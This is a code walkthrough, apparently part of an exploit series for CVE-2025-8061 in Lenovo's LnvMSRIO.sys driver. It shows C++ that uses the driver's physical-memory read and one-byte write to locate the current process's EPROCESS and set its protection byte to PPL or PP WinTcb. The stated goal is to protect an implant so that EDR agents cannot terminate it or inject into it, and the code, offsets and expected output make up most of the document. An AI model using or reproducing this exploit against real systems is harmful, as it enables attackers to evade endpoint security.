# 13 — Self PPL Elevation (_PS_PROTECTION Write)

**File:** `13_ppl_elevate.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Physical write (1 byte) + APL VA walk  
**Output:** Current process becomes PPL WinTcb or PP WinTcb — immune to PROCESS_TERMINATE and PROCESS_VM_WRITE from EDR agents

---

## Objective

Write the `_PS_PROTECTION` byte at `EPROCESS+0x87A` of the current process to self-elevate to Protected Process Light (PPL) or Protected Process (PP). Once set, EDR agents cannot kill or inject into this process — they receive `ACCESS_DENIED` when attempting to call `OpenProcess(PROCESS_TERMINATE, ...)`.

---

## Background Theory

### _PS_PROTECTION byte encoding

```
byte at EPROCESS+0x87A:
    bits[2:0]  Type    0=None, 1=ProtectedLight (PPL), 2=Protected (PP)
    bit[3]     Audit   rarely used
    bits[7:4]  Signer  0=None, 1=Authenticode, 2=CodeGen, 3=Antimalware,
                       4=Lsa, 5=Windows, 6=WinTcb, 7=WinSystem

Important values:
    0x00 = unprotected         (Type=None, Signer=None)
    0x31 = PPL Antimalware     (Type=PPL, Signer=3)  — Windows Defender level
    0x41 = PPL Lsa             (Type=PPL, Signer=4)
    0x51 = PPL Windows         (Type=PPL, Signer=5)
    0x61 = PPL WinTcb          (Type=PPL, Signer=6)  ← highest PPL
    0x62 = PP  WinTcb          (Type=PP, Signer=6)   ← csrss.exe, services.exe level
    0x72 = PP  WinSystem       (Type=PP, Signer=7)   ← reserved for the System process
```

### Effects of PPL/PP

When a process has Protection >= PPL WinTcb (0x61):
- `OpenProcess(PROCESS_TERMINATE)` from a non-PP/PPL process → `STATUS_ACCESS_DENIED`
- `OpenProcess(PROCESS_VM_WRITE)` → `STATUS_ACCESS_DENIED`
- `OpenProcess(PROCESS_CREATE_THREAD)` → `STATUS_ACCESS_DENIED`
- EDR agents (typically running unprotected or at PPL Antimalware 0x31) cannot kill the process

Attackers use this technique to protect an implant process from being terminated by EDR.

### PatchGuard risk

PatchGuard **may** verify `_PS_PROTECTION` on certain builds (not all). The safe window is as short as possible. The code implements a **30-second auto-restore** with early exit when the user presses Enter.

**Practical recommendation**: set PPL → perform the operation that requires protection → clear PPL. Do not leave it set.

### FindEprocessByPid() — why is this more complex than other files?

Files 01–06 find EPROCESS via physical scan. Here we need the **VA** of EPROCESS (not the PA) in order to:
1. Compute `prot_va = eproc_va + 0x87A`
2. Call `VaToPa(cr3, prot_va)` to get the physical address of the Protection byte

Solution: physical scan → find System EPROCESS PA → read `APL.Flink` (kernel VA) from PA → walk the APL chain via kernel VA (using VaToPa for each hop).

---

## Code Walkthrough

### ProtString() — decode protection byte for display

```cpp
static const char *ProtString(uint8_t b)
{
    uint8_t type   = b & 0x7;          // bits[2:0]
    uint8_t signer = (b >> 4) & 0xF;  // bits[7:4]
    static char buf[64];
    const char *types[]   = {"None","PPL","PP","?3","?4","?5","?6","?7"};
    const char *signers[] = {"None","Authenticode","CodeGen","Antimalware",
                              "Lsa","Windows","WinTcb","WinSystem"};
    snprintf(buf, sizeof(buf), "0x%02X (%s/%s)", b, types[type], signers[signer]);
    return buf;
}
// Example: ProtString(0x61) → "0x61 (PPL/WinTcb)"
//          ProtString(0x62) → "0x62 (PP/WinTcb)"
//          ProtString(0x00) → "0x00 (None/None)"
```

### Command-line argument: target protection level

```cpp
uint8_t target_prot = 0x61;  // default: PPL WinTcb
if (argc >= 2) {
    unsigned long v = strtoul(argv[1], nullptr, 16);
    // Parse hex string, e.g. argv[1] = "0x62" → v = 98 = 0x62
    target_prot = (uint8_t)(v & 0xFF);
}
// Usage: 13_ppl_elevate.exe 0x62   → PP WinTcb
//        13_ppl_elevate.exe 0x31   → PPL Antimalware
//        (no arg)                  → PPL WinTcb (0x61)
```

### FindEprocessByPid() — Phase 1: locate System EPROCESS PA

```cpp
for (uint64_t pa = 0x100000; pa < top && !system_eproc; pa += 1<<20) {
    if (pa >= 0xC0000000ULL && pa < 0x100000000ULL) continue;
    // Read 1MB chunk
    for (DWORD pg = 0; pg < (1u<<20); pg += 0x1000)
        PhysRead(pa+pg, buf+pg, 0x1000);
    
    for (DWORD off = 0; off + 0x5B8 <= (1u<<20); off += 8) {
        if (*(ULONG_PTR*)(buf+off+0x440) != 4) continue;          // PID = 4 (System)
        if (_strnicmp((char*)(buf+off+0x5A8), "System", 6) != 0) continue;
        uint64_t c = *(uint64_t*)(buf+off+0x028);
        if (!c || (c & 0xFFF)) continue;  // CR3 must be 4KB-aligned
        
        system_eproc = pa + off;  // physical address of the System EPROCESS
        break;
    }
}
```

`system_eproc` is a **PA** (physical address), not a VA.

### Phase 2: read APL.Flink from PA

```cpp
uint64_t apl_flink = 0;
PhysReadU64(system_eproc + 0x448, &apl_flink);
// System EPROCESS+0x448 = ActiveProcessLinks.Flink = kernel VA of the next EPROCESS's links
```

`apl_flink` is a **kernel VA** (0xFFFF8...). We use the PA of the System EPROCESS to read this field, but the value read out is a kernel VA.

### Phase 3: walk the APL chain via VaToPa

```cpp
uint64_t cur_apl_va = apl_flink;  // kernel VA of System->APL.Flink target

for (int i = 0; i < 1024; i++) {
    uint64_t eproc_va = cur_apl_va - 0x448;
    // cur_apl_va points to EPROCESS.ActiveProcessLinks (offset 0x448)
    // → subtract 0x448 to get the base VA of EPROCESS
    
    uint64_t pid = 0;
    if (!KernelReadU64(cr3, eproc_va + 0x440, &pid)) break;
    // KernelReadU64 → VaToPa(cr3, va) → PhysReadU64(pa)
    
    if ((DWORD)pid == target_pid) {
        return eproc_va;  // found!
    }
    
    uint64_t next_apl_va = 0;
    if (!KernelReadU64(cr3, cur_apl_va, &next_apl_va)) break;
    // Read the Flink of the current APL entry = VA of the next EPROCESS's APL
    
    if (next_apl_va == apl_flink) break;  // looped back to System → not found
    cur_apl_va = next_apl_va;
}
```

Limit of 1024 iterations to avoid an infinite loop if the list is corrupt.

### Read the original Protection byte

```cpp
uint64_t prot_va = eproc_va + 0x87A;        // kernel VA of the Protection byte
uint64_t prot_pa = VaToPa(cr3, prot_va);    // → physical address

// Read the 8-byte aligned block containing this byte
uint8_t readbuf[8] = {};
PhysRead(prot_pa & ~7ULL, readbuf, 8);
// prot_pa & ~7: round down to 8-byte boundary
// Read 8 aligned bytes

orig_byte = readbuf[prot_pa & 7];
// Index within the 8-byte block = prot_pa mod 8
// Extracts the exact byte needed
```

This read approach avoids unaligned access (the driver may not support unaligned reads on some systems).

### PhysWriteU8() — write 1 byte

```cpp
struct PhysWriteIn1 { UINT64 PA; DWORD OT; DWORD AS; UINT8 Data; };

static bool PhysWriteU8(uint64_t pa, uint8_t val)
{
    PhysWriteIn1 in = { pa, 1, 1, val };
    // PA: physical address
    // OT=1: operation type = write
    // AS=1: access size = 1 byte
    // Data: byte value to write
    DWORD got = 0;
    return DeviceIoControl(g_dev, IOCTL_PHYS_WRITE,
                           &in, sizeof(in), nullptr, 0, &got, nullptr) != FALSE;
}
```

Driver IOCTL_PHYS_WRITE with AccessSize=1 performs a byte-level write. This is critical because the Protection byte shares its 8-byte QWORD with other fields — writing 8 bytes would corrupt them.

### Verify write

```cpp
PhysWriteU8(prot_pa, target_prot);

// Verify: read back 8 bytes, extract the specific byte
uint8_t verify = 0;
PhysRead(prot_pa & ~7ULL, readbuf, 8);
verify = readbuf[prot_pa & 7];

if (verify != target_prot) {
    printf("[!] Write did not stick (HVCI?): read back 0x%02X\n", verify);
    return 1;
}
```

### 30-second countdown with non-blocking input check

```cpp
HANDLE hStdin = GetStdHandle(STD_INPUT_HANDLE);
for (int sec = 30; sec > 0; sec--) {
    printf("\r    Restoring in %2d seconds...  ", sec);
    fflush(stdout);
    // \r = carriage return (no newline) → overwrites the previous line with countdown
    
    for (int ms = 0; ms < 10; ms++) {
        Sleep(100);  // 100ms × 10 = 1 second per outer loop iteration
        
        DWORD avail = 0;
        PeekNamedPipe(hStdin, nullptr, 0, nullptr, &avail, nullptr);
        // PeekNamedPipe: non-blocking check for available input
        // (works with the stdin console pipe)
        
        if (avail) {
            INPUT_RECORD ir;
            DWORD read = 0;
            if (ReadConsoleInputA(hStdin, &ir, 1, &read) && read) {
                if (ir.EventType == KEY_EVENT &&
                    ir.Event.KeyEvent.bKeyDown &&
                    ir.Event.KeyEvent.uChar.AsciiChar == '\r') {
                    // Enter key → exit countdown immediately
                    sec = 0;
                    break;
                }
            }
        }
    }
    if (sec <= 0) break;
}
```

Why `PeekNamedPipe` + `ReadConsoleInputA` instead of `getchar()`?

- `getchar()` is blocking — no timeout possible
- `PeekNamedPipe` non-blocking checks for available data
- `ReadConsoleInputA` reads keyboard events without requiring a newline (avoids buffering)

### Restore immediately after countdown

```cpp
printf("\n[*] Restoring Protection to %s...\n", ProtString(orig_byte));
PhysWriteU8(prot_pa, orig_byte);  // write back the original byte (0x00 or 0x31, etc.)

// Final verify
PhysRead(prot_pa & ~7ULL, readbuf, 8);
verify = readbuf[prot_pa & 7];
printf("[+] Protection restored to %s\n", ProtString(verify));
```

---

## Protection Byte Reference Table

| Value | Type | Signer | Description |
|-------|------|--------|-------------|
| 0x00 | None | None | Unprotected (default for user processes) |
| 0x31 | PPL | Antimalware | Windows Defender, antivirus level |
| 0x41 | PPL | Lsa | LSASS protection (lsass.exe) |
| 0x51 | PPL | Windows | Windows system services |
| 0x61 | PPL | WinTcb | Highest PPL (csrss-adjacent) |
| 0x62 | PP | WinTcb | Full Protected Process (csrss.exe, services.exe) |
| 0x72 | PP | WinSystem | System/Secure System only |

---

## Expected Output

```
=== CVE-2025-8061 | LnvMSRIO.sys | 13 - Self PPL Elevation ===

[!] WARNING: PatchGuard checks _PS_PROTECTION on some builds.
    Auto-restore is performed after 30 seconds.

[*] Target protection: 0x61 (PPL/WinTcb)
[*] Current PID = 5432

[+] CR3 = 0xFFFF00012AB00000
[+] Own EPROCESS VA = 0xFFFF8880ABCDE000
[+] Original Protection = 0x00 (None/None)

[*] Elevating to 0x61 (PPL/WinTcb)...
[+] Protection set to 0x61 (PPL/WinTcb)

[+] This process is now protected:
    - OpenProcess(PROCESS_TERMINATE) from non-PP/PPL will fail
    - OpenProcess(PROCESS_VM_WRITE)  from non-PP/PPL will fail
    - EDR agents running at lower protection cannot kill this process

[*] Auto-restoring in 30 seconds. Press Enter to restore immediately.

    Restoring in 28 seconds...

[*] Restoring Protection to 0x00 (None/None)...
[+] Protection restored to 0x00 (None/None)
[+] Done.
```

---

## Stability

| Issue | Severity |
|-------|----------|
| **PatchGuard** | **RISKY** — PG may verify Protection on certain builds → BSOD |
| **HVCI** | Not affected — EPROCESS is not in HV-protected pages |
| Safe window | Ideally a few seconds; code uses 30s with early exit |
| EDR detection | Some EDRs detect self-PPL elevation via kernel telemetry |
| EDR already at PP level | If the EDR runs at PP WinTcb or higher, its OpenProcess calls still succeed |

---

## Flow Summary

```
Parse argv[1] → target_prot (default 0x61)

GetSystemCR3() → cr3

GetCurrentProcessId() → my_pid

FindEprocessByPid(cr3, my_pid):
    Phase 1: physical scan → System EPROCESS PA
    Phase 2: PhysReadU64(system_pa + 0x448) → apl_flink (kernel VA)
    Phase 3: walk APL via VaToPa:
        cur = apl_flink
        loop 1024×:
            eproc_va = cur - 0x448
            KernelReadU64(eproc_va + 0x440) → pid
            if pid == my_pid → return eproc_va
            KernelReadU64(cur) → next apl VA
    → eproc_va

prot_va = eproc_va + 0x87A
prot_pa = VaToPa(cr3, prot_va)

PhysRead(prot_pa & ~7, 8 bytes) → orig_byte = byte at prot_pa%8
PhysWriteU8(prot_pa, target_prot=0x61)
PhysRead verify → 0x61 ✓

[+] Process is PPL WinTcb
[+] EDR cannot PROCESS_TERMINATE

30-second countdown (early exit on Enter)

PhysWriteU8(prot_pa, orig_byte=0x00)  ← RESTORE
```
